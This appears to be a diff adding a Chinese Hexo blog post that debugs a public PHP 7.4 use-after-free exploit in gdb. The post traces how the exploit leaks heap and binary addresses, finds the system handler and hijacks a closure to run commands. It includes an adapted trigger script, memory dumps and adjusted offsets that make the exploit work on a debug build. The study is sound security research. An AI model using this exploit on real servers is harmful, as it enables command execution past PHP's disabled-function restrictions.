@@ -1,0 +1,876 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>PHP-UAF漏洞初探 - Twings</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期四, 三月 26日 2020, 11:30 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    3.2k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      14 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>没什么，想学就学了。</p>
+<p>exp：<a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p>
+<a id="more"></a>
+<hr>
+<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>gdb 调试的是 C 层面的代码，而调试 php 又不好看到内存的变化，头疼。看到一个好像调试 cli 模式的 phpdbg，现在用不着，以后再试试。</p>
+<p>先开一个 docker 吧：</p>
+<pre><code class="shell">docker run -id --privileged --name php -p 8080:80 php:7.4.2-apache
+</code></pre>
+<p>修改 /etc/apache2/mods-available/mpm_prefork.conf，减少进程数量：</p>
+<pre><code class="xml">&lt;IfModule mpm_prefork_module&gt;
+    StartServers             1
+    MinSpareServers          0
+    MaxSpareServers         1
+    MaxRequestWorkers      1
+    MaxConnectionsPerChild   0
+&lt;/IfModule&gt;
+</code></pre>
+<p>这次打算调试一下 apache mod_php，需要重新安装 php，生成可以调试的 libphp.so，所以先安装 apache2-dev（有的源可能装不了，我用的是 debian10 的阿里云源），再重新编译安装 php：</p>
+<pre><code class="shell">./configure --enable-phpdbg-debug --enable-debug --with-apxs2=/usr/bin/apxs2 CFLAGS=&quot;-g3 -gdwarf-4&quot;
+</code></pre>
+<p>记得 make 和 make install，然后我们就能看到 /usr/lib/apache2/modules 下面的 libphp.so 更新了。</p>
+<p>结果发现 exp 打不通了，一脸懵。没办法，看看它原本的编译方式再来一遍吧。</p>
+<pre><code class="shell">./configure --build=x86_64-linux-gnu --with-config-file-path=/usr/local/etc/php --with-config-file-scan-dir=/usr/local/etc/php/conf.d --enable-option-checking=fatal --with-mhash --enable-ftp --enable-mbstring --enable-mysqlnd --with-password-argon2 --with-sodium=shared --with-pdo-sqlite=/usr --with-sqlite3=/usr --with-curl --with-libedit --with-openssl --with-zlib --with-pear --with-libdir=lib/x86_64-linux-gnu --with-apxs2 --disable-cgi build_alias=x86_64-linux-gnu --enable-debug CFLAGS=&quot;-g3 -gdwarf-4&quot; --enable-phpdbg-debug
+</code></pre>
+<p>还是打不通 -_- ，看来开了 debug 会导致一些内存上的差异。</p>
+<p>再试试 php-fpm，官方镜像打不通，我还是自己动手调试一下吧。</p>
+<hr>
+<h3 id="本地-PHP-Cli-调试"><a href="#本地-PHP-Cli-调试" class="headerlink" title="本地  PHP - Cli  调试"></a>本地  PHP - Cli  调试</h3><p>本地自己编译安装一个 php7.4.2 的 cli，只加了 –prefix 参数，可以读取到符号表，exp 也能打通。初次调试，我也不知道怎么调试比较好，只能一步步来了。先从 exp 修改一个 UAF 的测试脚本，用来看看这些变量的地址关系：</p>
+<pre><code class="php">&lt;?php
+pwn(&quot;id&quot;);
+
+function pwn($cmd) {
+    global $abc, $helper, $backtrace;
+
+    class Vuln {
+        public $a;
+        public function __destruct() {
+            global $backtrace;
+            unset($this-&gt;a);
+            $backtrace = (new Exception)-&gt;getTrace(); # ;)
+            if(!isset($backtrace[1][&#39;args&#39;])) { # PHP &gt;= 7.4
+                $backtrace = debug_backtrace();
+            }
+        }
+    }
+
+    class Helper {
+        public $a, $b, $c, $d;
+    }
+
+    function str2ptr(&amp;$str, $p = 0, $s = 8) {
+        $address = 0;
+        for($j = $s-1; $j &gt;= 0; $j--) {
+            $address &lt;&lt;= 8;
+            $address |= ord($str[$p+$j]);
+        }
+        return $address;
+    }
+
+    function trigger_uaf($arg) {
+        # str_shuffle prevents opcache string interning
+        $arg = str_repeat(&#39;T&#39;, 79);
+        var_dump($arg);
+        $vuln = new Vuln();
+        $vuln-&gt;a = $arg;
+        var_dump($vuln-&gt;a);
+    }
+
+    trigger_uaf(&#39;x&#39;);
+    $abc = $backtrace[1][&#39;args&#39;][0];
+    var_dump($abc);
+    $helper = new Helper;
+    var_dump($helper);
+    $helper-&gt;b = function ($x) { };
+    var_dump($helper);
+    if(strlen($abc) == 79 || strlen($abc) == 0) {
+        die(&quot;UAF failed&quot;);
+    }
+}
+</code></pre>
+<p>给 php_var_dump 下断点，我们就能在内存中追踪这些变量了。运行编译好的 sapi 下的 php-cli 程序，我们首先可以看到内存中的 $arg 变量的数据是这样一个结构体：</p>
+<p><img src="/css/images/uaf/2020032501.png" srcset="/img/loading.gif" alt=""></p>
+<p>在源码则是这样定义的：</p>
+<pre><code class="c">typedef union _zend_value {
+    zend_long         lval;                /* long value */
+    double            dval;                /* double value */
+    zend_refcounted  *counted;
+    zend_string      *str;
+    zend_array       *arr;
+    zend_object      *obj;
+    zend_resource    *res;
+    zend_reference   *ref;
+    zend_ast_ref     *ast;
+    zval             *zv;
+    void             *ptr;
+    zend_class_entry *ce;
+    zend_function    *func;
+    struct {
+        uint32_t w1;
+        uint32_t w2;
+    } ww;
+} zend_value;
+
+struct _zval_struct {
+    zend_value        value;            /* value */
+    union {
+        struct {
+            ZEND_ENDIAN_LOHI_3(
+                zend_uchar    type,            /* active type */
+                zend_uchar    type_flags,
+                union {
+                    uint16_t  extra;        /* not further specified */
+                } u)
+        } v;
+        uint32_t type_info;
+    } u1;
+    union {
+        uint32_t     next;                 /* hash collision chain */
+        uint32_t     cache_slot;           /* cache slot (for RECV_INIT) */
+        uint32_t     opline_num;           /* opline number (for FAST_CALL) */
+        uint32_t     lineno;               /* line number (for ast nodes) */
+        uint32_t     num_args;             /* arguments number for EX(This) */
+        uint32_t     fe_pos;               /* foreach position */
+        uint32_t     fe_iter_idx;          /* foreach iterator index */
+        uint32_t     access_flags;         /* class constant access flags */
+        uint32_t     property_guard;       /* single property guard */
+        uint32_t     constant_flags;       /* constant flags */
+        uint32_t     extra;                /* not further specified */
+    } u2;
+};
+</code></pre>
+<p>u2 都是 0，暂且不管；u1 是类型相关的数据，6 代表这是个字符串；value 则是变量值，我们可以看到 string 变量 value 中的每种类型基本都表示同一个地址，也就是说各种变量在底层都是不分家的，只靠 type 来将地址处的数据处理成相应的结构体。换句话说两个不同类型的变量指向同一个地址，就会因为类型不同而取出不同的数据。</p>
+<p>$arg 是 string，在底层是一个 zend_string 类型，由类型、长度和值等组成：</p>
+<p><img src="/css/images/uaf/2020032502.png" srcset="/img/loading.gif" alt=""></p>
+<p>在源码中则是这样的：</p>
+<pre><code class="c">struct _zend_string {
+    zend_refcounted_h gc;
+    zend_ulong        h;                /* hash value */
+    size_t            len;
+    char              val[1];
+};
+</code></pre>
+<p>有趣的一点是，php 的 strlen 函数获取的实际上就是这里的 len：</p>
+<pre><code class="c">ZEND_FUNCTION(strlen)
+{
+    zend_string *s;
+
+    ZEND_PARSE_PARAMETERS_START(1, 1)
+        Z_PARAM_STR(s)
+    ZEND_PARSE_PARAMETERS_END();
+
+    RETVAL_LONG(ZSTR_LEN(s));
+}
+...
+#define ZSTR_LEN(zstr)  (zstr)-&gt;len
+</code></pre>
+<p>而访问字符串则是访问这里的 val 部分，unset 一个字符串则会把前面的 gc 和 h 部分修改，后面的 len 和 val 不会修改，这里我 unset 了一个 66 长度的字符串（Twings * 11）做测试：</p>
+<pre><code class="php">&lt;?php
+class Helper {
+    public $a;
+}
+$s = str_repeat(&quot;Twings&quot;, 11);
+var_dump($s);
+unset($s);
+$helper = new Helper();
+var_dump($helper);
+</code></pre>
+<p>结果：</p>
+<pre><code class="c">pwndbg&gt; x/20xg 0x7ffff3e7f070
+0x7ffff3e7f070:    0x00007ffff3e7f0e0    0x0000000000000000
+0x7ffff3e7f080:    0x0000000000000042    0x775473676e697754
+0x7ffff3e7f090:    0x6e69775473676e69    0x73676e6977547367
+0x7ffff3e7f0a0:    0x775473676e697754    0x6e69775473676e69
+0x7ffff3e7f0b0:    0x73676e6977547367    0x775473676e697754
+0x7ffff3e7f0c0:    0x6e69775473676e69    0x0000000000007367
+0x7ffff3e7f0d0:    0x0000000000000000    0x0000000000000000
+0x7ffff3e7f0e0:    0x00007ffff3e7f150    0x0000000000000000
+0x7ffff3e7f0f0:    0x0000000000000000    0x0000000000000000
+0x7ffff3e7f100:    0x0000000000000000    0x0000000000000000
+</code></pre>
+<p>因为长度没有对上，所以新的 helper 对象并没有覆盖 unset 掉的 $s 字符串的空间，会存放在更小的堆里面。</p>
+<p>这里有个问题，为什么需要一个函数来调用 Vuln 类，还需要再一步引用待释放变量和利用 Vuln 的构析函数？因为<a href="https://bugs.php.net/bug.php?id=76047" target="_blank" rel="noopener">BUG报告</a>说，错误需要引用计数为 2，且与构析函数有关。具体的涉及 PHP 底层，这里不深入研究。</p>
+<p>我们继续运行脚本，会发现，$vuln-&gt;a 跟 $abc 的数据指针都指向了 $arg 的地方。再后面，helper 恰好占用了这个被释放的字符串的位置：</p>
+<p><img src="/css/images/uaf/2020032503.png" srcset="/img/loading.gif" alt=""></p>
+<p>按照源码中的定义：</p>
+<pre><code class="c">struct _zend_object {
+    zend_refcounted_h gc;
+    uint32_t          handle; // TODO: may be removed ???
+    zend_class_entry *ce;
+    const zend_object_handlers *handlers;
+    HashTable        *properties;
+    zval              properties_table[1];
+};
+</code></pre>
+<p>每个成员要占据 0x10 的地址空间，也就是说如果有更多或者更少成员变量，那么这个对象就不会存放在这个能存放长度 79 的字符串的地方。</p>
+<p>这里看起来是一个个固定大小的堆，每个堆的开头会有一个指向下一个堆的指针。helper 对象中有 4 个成员变量，而只有一个赋了值，所以其他三个都是 0x0000003000000030 和 0x0000000000000001 组成的未定义数据，而 b 则是一个 zval 类型的数据：</p>
+<p><img src="/css/images/uaf/2020032504.png" srcset="/img/loading.gif" alt=""></p>
+<p>里面放着匿名函数相关的数据，b 实际上是一个 closure_handlers 对象：</p>
+<p><img src="/css/images/uaf/2020032505.png" srcset="/img/loading.gif" alt=""></p>
+<p>以上就是 exp 中用到的几个主要变量的情况，我们用调试函数拿到的 $abc 实际上跟 $helper 指向同一个地方，而 php 底层还是把 $abc 当作一个字符串来看，所以 strlen 和 [] 访问字符串大概就是这么个情况：</p>
+<p><img src="/css/images/uaf/2020032506.png" srcset="/img/loading.gif" alt=""></p>
+<p>所以在 UAF 正常的情况下，strlen($abc) 应该是一个很大的数字。我们继续往下看 exp：</p>
+<pre><code class="php">$closure_handlers = str2ptr($abc, 0);
+$php_heap = str2ptr($abc, 0x58);
+$abc_addr = $php_heap - 0xc8;
+</code></pre>
+<p>$closure_handlers 其实是 std_object_handlers 的地址，这个暂且不提；php_heap 则是下一个堆的头指针，也就是 0x00007ffff3e7f150；将下一个堆的头指针减去偏移的 0x58 + 一个堆的大小 0x70，就可以回到 $abc 处，即拿到 $abc 的地址：</p>
+<p><img src="/css/images/uaf/2020032507.png" srcset="/img/loading.gif" alt=""></p>
+<p>接下来的四步 write 则是在伪造 a，写完之后：</p>
+<p><img src="/css/images/uaf/2020032508.png" srcset="/img/loading.gif" alt=""></p>
+<p>a 变量变成了指向 0x00007ffff3e7f0e8 处的一个 zval：</p>
+<pre><code class="c">pwndbg&gt; p (zval)*0x7ffff3e7f098
+$4 = {
+  value = {
+    lval = 140737285452008, 
+    dval = 6.9533457830790204e-310, 
+    counted = 0x7ffff3e7f0e8, 
+    str = 0x7ffff3e7f0e8, 
+    arr = 0x7ffff3e7f0e8, 
+    obj = 0x7ffff3e7f0e8, 
+    res = 0x7ffff3e7f0e8, 
+    ref = 0x7ffff3e7f0e8, 
+    ast = 0x7ffff3e7f0e8, 
+    zv = 0x7ffff3e7f0e8, 
+    ptr = 0x7ffff3e7f0e8, 
+    ce = 0x7ffff3e7f0e8, 
+    func = 0x7ffff3e7f0e8, 
+    ww = {
+      w1 = 4092063976, 
+      w2 = 32767
+    }
+  }, 
+  u1 = {
+    v = {
+      type = 10 &#39;\n&#39;, 
+      type_flags = 0 &#39;\000&#39;, 
+      u = {
+        extra = 0
+      }
+    }, 
+    type_info = 10
+  }, 
+  u2 = {
+    next = 0, 
+    cache_slot = 0, 
+    opline_num = 0, 
+    lineno = 0, 
+    num_args = 0, 
+    fe_pos = 0, 
+    fe_iter_idx = 0, 
+    access_flags = 0, 
+    property_guard = 0, 
+    constant_flags = 0, 
+    extra = 0
+  }
+}
+</code></pre>
+<p>a 的类型为 10，即 REFERENCE：</p>
+<pre><code class="c">struct _zend_reference {
+    zend_refcounted_h              gc;
+    zval                           val;
+    zend_property_info_source_list sources;
+};
+</code></pre>
+<p>这个 REFERENCE 有什么用后面再看，我们继续看 exp，closure_obj 其实就是 b 的地址，接下来则是重头戏的泄露地址：</p>
+<pre><code class="php">$binary_leak = leak($closure_handlers, 8);
+</code></pre>
+<p>很明显是使用 $closure_handlers 的地址，即 0x00000000011ff820 处的 std_object_handlers 来泄露，写完数据之后 a 是这个样子的：</p>
+<pre><code class="c">0x7ffff3e7f0e0:    0x00007ffff3e7f150    0x0000000000000002
+0x7ffff3e7f0f0:    0x00000000011ff818    0x0000000000000006
+</code></pre>
+<p>后面三段就是 a 在内存里面的数据，转换成 ref 类型就是：</p>
+<pre><code class="c">pwndbg&gt; p *((zval)*0x7ffff3e7f098)-&gt;value-&gt;ref
+$7 = {
+  gc = {
+    refcount = 2, 
+    u = {
+      type_info = 0
+    }
+  }, 
+  val = {
+    value = {
+      lval = 18872344, 
+      dval = 9.3241768268981742e-317, 
+      counted = 0x11ff818, 
+      str = 0x11ff818, 
+      arr = 0x11ff818, 
+      obj = 0x11ff818, 
+      res = 0x11ff818, 
+      ref = 0x11ff818, 
+      ast = 0x11ff818, 
+      zv = 0x11ff818, 
+      ptr = 0x11ff818, 
+      ce = 0x11ff818, 
+      func = 0x11ff818, 
+      ww = {
+        w1 = 18872344, 
+        w2 = 0
+      }
+    }, 
+    u1 = {
+      v = {
+        type = 6 &#39;\006&#39;, 
+        type_flags = 0 &#39;\000&#39;, 
+        u = {
+          extra = 0
+        }
+      }, 
+      type_info = 6
+    }, 
+    ...
+}
+</code></pre>
+<p>也就是说，a 这个 REFENCE 实际上指向了 0x11ff818，调用 strlen 就是把 0x11ff818 处的数据当作了 string 来处理，拿到的就是：</p>
+<p><img src="/css/images/uaf/2020032509.png" srcset="/img/loading.gif" alt=""></p>
+<p>也就是 zend_object_std_dtor 的地址，因为 strlen 返回的是指针 + 0x10 地址处的数据，所以 leak 函数泄露的就是 $addr + $p 地址处的数据。然后是 get_binary_base 函数，从 zend_object_std_dtor  往回搜索 ELF 文件的开头，找到了就是程序基地址，一共搜索 0x1000000 的地址，而 zend_object_std_dtor 函数的地址在没有 PIE 的情况下是 0x6d0ac0，所以一般都能找得到。接下来是 parse_elf，看名字是个解析 elf 文件的函数，看不懂，反正 ELF 格式也差不多，就跳过好了。</p>
+<p>下面是根据解析 ELF 之后获得的 data 段 address、size 之类的数据获取函数基地址，同样也是搜索，开头是在 data 段前方：</p>
+<p><img src="/css/images/uaf/2020032510.png" srcset="/img/loading.gif" alt=""></p>
+<p>而结束的地方已经过了 bss 段，所以一般也能搜索得到。在 data 段里面可以看到有很多 zend_function_entry 都在这里，zend_function_entry 是 php 底层存储函数的结构体：</p>
+<pre><code class="c">typedef struct _zend_function_entry {
+    const char *fname;
+    zif_handler handler;
+    const struct _zend_internal_arg_info *arg_info;
+    uint32_t num_args;
+    uint32_t flags;
+} zend_function_entry;
+</code></pre>
+<p>fname 是函数名，handler 就是存放在内存里面的函数实现了，所以只要找到 system 函数的 handler 地址，然后用它替换掉 b ，就可以执行系统命令了。zend_function_entry  在内存是这样存放的：</p>
+<p><img src="/css/images/uaf/2020032511.png" srcset="/img/loading.gif" alt=""></p>
+<p>constant 和 bin2hex 就在 basic_functions 附近，所以可以通过搜索这两个函数来定位 basic_functions。同时我们可以看到 basic_functions 是一个函数数组，而 system 函数也位于 basic_functions 内：</p>
+<pre><code class="c">  }, {
+    fname = 0xd93688 &quot;exec&quot;, 
+    handler = 0x5cf7a0 &lt;zif_exec&gt;, 
+    arg_info = 0x11931e0 &lt;arginfo_exec&gt;, 
+    num_args = 3, 
+    flags = 0
+  }, {
+    fname = 0xd9365d &quot;system&quot;, 
+    handler = 0x5cf7b0 &lt;zif_system&gt;, 
+    arg_info = 0x1193180 &lt;arginfo_system&gt;, 
+    num_args = 2, 
+    flags = 0
+  }, {
+    fname = 0xd93664 &quot;escapeshellcmd&quot;, 
+    handler = 0x5cfd60 &lt;zif_escapeshellcmd&gt;, 
+    arg_info = 0x11930e0 &lt;arginfo_escapeshellcmd&gt;, 
+    num_args = 1, 
+    flags = 0
+  }, {
+    fname = 0xd93673 &quot;escapeshellarg&quot;, 
+    handler = 0x5cfe80 &lt;zif_escapeshellarg&gt;, 
+    arg_info = 0x11930a0 &lt;arginfo_escapeshellarg&gt;, 
+    num_args = 1, 
+    flags = 0
+  }, {
+    fname = 0xd8f699 &quot;passthru&quot;, 
+    handler = 0x5cf7c0 &lt;zif_passthru&gt;, 
+    arg_info = 0x1193120 &lt;arginfo_passthru&gt;, 
+    num_args = 2, 
+    flags = 0
+  }, {
+    fname = 0xd93682 &quot;shell_exec&quot;, 
+    handler = 0x5cff70 &lt;zif_shell_exec&gt;, 
+    arg_info = 0x1193060 &lt;arginfo_shell_exec&gt;, 
+    num_args = 1, 
+    flags = 0
+  }, {
+    fname = 0xd9368d &quot;proc_open&quot;, 
+    handler = 0x626af0 &lt;zif_proc_open&gt;, 
+    arg_info = 0x118fbe0 &lt;arginfo_proc_open&gt;, 
+    num_args = 6, 
+    flags = 0
+  }, {
+</code></pre>
+<p>所以同样地从 basic_functions 往后搜索，我们就能拿到 system 函数的地址了。</p>
+<p>接下来我们就要把 system 函数写到 b 上面。因为下个空块已经用来泄露地址了，所以 exp 的做法是在下下个空块直接伪造一个新的对象，首先把整个 b 复制过去，b 的定义如下：</p>
+<pre><code class="c">typedef struct _zend_closure {
+    zend_object       std;
+    zend_function     func;
+    zval              this_ptr;
+    zend_class_entry *called_scope;
+    zif_handler       orig_internal_handler;
+} zend_closure;
+</code></pre>
+<p>长度可以在 gdb 里面计算出来，为 0x130。然后 system 函数地址要填在哪里呢？</p>
+<p>exp 是覆盖了 func-&gt;internal_function.handler，我们在源码里搜索也能看到 zend 里面有大量调用这个函数的地方，internal_function 是个这样的结构体：</p>
+<pre><code class="c">typedef struct _zend_internal_function {
+    /* Common elements */
+    zend_uchar type;
+    zend_uchar arg_flags[3]; /* bitset of arg_info.pass_by_reference */
+    uint32_t fn_flags;
+    zend_string* function_name;
+    zend_class_entry *scope;
+    zend_function *prototype;
+    uint32_t num_args;
+    uint32_t required_num_args;
+    zend_internal_arg_info *arg_info;
+    /* END of common elements */
+
+    zif_handler handler;
+    struct _zend_module_entry *module;
+    void *reserved[ZEND_MAX_RESERVED_RESOURCES];
+} zend_internal_function;
+</code></pre>
+<p>可以看到跟参数有关的几个数据：num_args、required_num_args、*arg_info，handler 则是调用的函数。一般情况下 type 为 2，代表是用户函数，而 handler 则是一个无法访问的地址（在 7.2.11 好像是正常的地址），exp 将 type 修改为 1 代表内部函数，再将 system 地址写到 handler 上面之后，php 就会通过 ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER 调用它，最后调用的就是 php 自己实现的 system 函数。具体的执行流程涉及底层 zend 虚拟机、op 之类的东西，我不懂就不研究了。</p>
+<hr>
+<h3 id="调试开启-debug-的-apache-mod-php"><a href="#调试开启-debug-的-apache-mod-php" class="headerlink" title="调试开启 debug 的 apache mod_php"></a>调试开启 debug 的 apache mod_php</h3><p>漏洞算是调通了，现在试试调一下之前调不通的情况，到 write($abc, 0x10, $abc_addr + 0x60); 这一步的时候，问题已经很明显了：</p>
+<pre><code class="c">pwndbg&gt; x/40xg 0x7fae5bc68000
+0x7fae5bc68000:    0x0000001800000001    0x0000000000000000
+0x7fae5bc68010:    0x00007fae5bc023d8    0x00007fae5b77cec0
+0x7fae5bc68020:    0x0000000000000000    0xffffffffffffff98
+0x7fae5bc68030:    0x000000000000000a    0x00007fae5bc74c00
+0x7fae5bc68040:    0x0000000000000308    0x00007ffdf2695d60
+0x7fae5bc68050:    0x0000000000000001    0x00007ffdf2695d60
+0x7fae5bc68060:    0x0000000000000001    0x0000000000000000
+0x7fae5bc68070:    0x0000000000000000    0x0000000000000002
+0x7fae5bc68080:    0x0000000000000068    0x0000000000000006
+0x7fae5bc68090:    0x0000000000000000    0x00000000000000c4
+0x7fae5bc680a0:    0x00007fae5bc5e100    0x00007fae5bc81f80
+0x7fae5bc680b0:    0x00007fae5bc5e140    0x00007fae5bc82730
+0x7fae5bc680c0:    0x00007fae5bc58e10    0x00007fae5bc58e60
+0x7fae5bc680d0:    0x00007fae5bc58eb0    0x00007fae5bc82050
+0x7fae5bc680e0:    0x00007fae5bc58a50    0x00007fae5bc5eac0
+0x7fae5bc680f0:    0x00007fae5bc804c0    0x00007fae5bc58b40
+0x7fae5bc68100:    0x00007fae5bc823c0    0x00007fae5bc82550
+0x7fae5bc68110:    0x0000555ef2e0eeb0    0x0000000000000000
+0x7fae5bc68120:    0x0000000000000078    0x00007fae5b627628
+0x7fae5bc68130:    0x0000000000000000    0x0000000000000376
+</code></pre>
+<p>exp 不通的原因就是现在内存分配方式跟之前不同了，新建的 helper 对象并没有分配到堆链里面，也就找不到每个堆的头指针，所以计算 $abc 地址的时候就会出错，变成 0x0 - 0xc8，a 指向的 $abc_addr + 0x60 就变成了一个超出范围的地址 0xffffffffffffff98，导致了程序崩溃。</p>
+<p>所以我们需要换一个方式来计算 $abc 地址，我们往下看，可以看到下面有大小为 0xa0 的堆块：</p>
+<p><img src="/css/images/uaf/2020032512.png" srcset="/img/loading.gif" alt=""></p>
+<p>所以我们修改一下 php_heap 和 abc_addr 的计算方式：</p>
+<pre><code class="php">$php_heap = str2ptr($abc, 0x1c8);
+$abc_addr = $php_heap - 0x1c8 - 0xa0;
+</code></pre>
+<p>然后再测试：</p>
+<p><img src="/css/images/uaf/2020032513.png" srcset="/img/loading.gif" alt=""></p>
+<p>exp 没问题，能打通了，good。</p>
+<hr>
+<h3 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a>php-fpm</h3><p>php-fpm 不加 debug 都打不通，加上 debug 调试一番，好像解析 ELF 出了问题，找不到头，不懂。</p>
+<p>要用的时候查看版本和编译参数，然后直接通过偏移来算好了。</p>
+<hr>
+<p>Orz</p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Pwn/">Pwn</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/03/22/CVE-2019-11043-Nginx-php-fpm-RCE漏洞复现/">
+                        <span>CVE-2019-11043 Nginx+php-fpm RCE漏洞复现</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
